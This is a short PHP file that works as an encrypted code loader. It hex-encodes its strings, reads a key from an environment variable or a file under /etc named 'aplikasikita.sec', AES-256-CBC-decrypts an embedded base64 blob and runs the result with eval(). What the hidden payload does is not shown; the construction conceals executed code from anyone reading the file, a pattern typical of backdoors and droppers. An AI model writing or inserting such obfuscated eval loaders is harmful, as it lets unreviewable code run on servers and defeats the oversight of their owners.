<?php
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('91+ZHLT6LeGgM0gJtF4SJw==');

$c=base64_decode(

'A9SAeXaapOlDZDI5YqBvmANIEZUvOaa3MKj/hDtWrGuEQ+YkQ17RcgA07yQXgq2Kh2HxrJnesVHe' .
'dgsZLI1/inmrXaiRulh0KKK8pqsOf1B7v1j8+m1MOwsHWbtqvFtWuRElvabeAnsWHdtMq8Iv7ckJ' .
'Wi6LRPhMxvwM62pXOBiSpEe1VoHrVHBvLOcCLEeDBa7qeQmT5uwwtm4QeKxpJQDQ0JqfgBcz/T56' .
'F10jHPYVigSJMBZWblKVScfY8OeZsQxgicrY/0T/9PwHhWX4RSDcyXtHW79DY5O4UvvDKsmkjlPD' .
'sFxDXFb78arCMuY3WO/lefT46R3+GvSLQmQiFhNuY4oDSdfu/gp3pexq8OeuJka6Uxk0olgKrHIQ' .
'XnjgJ1uCp1AXrcM3V9MgQWWCAYtsqEjvWhILbwQx9cNkPOSTteZ/nFOQK+k5t/am1um1+yi3ljH7' .
'Mr3dgDATqY99uA+j3c2LMRxZjI/Uuq6abpCtsjvoquIQs5OorIorVCErqzqJ6rM1VULFBlGirxqj' .
'zSiF+X6syyWzPSor/pONtWE='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

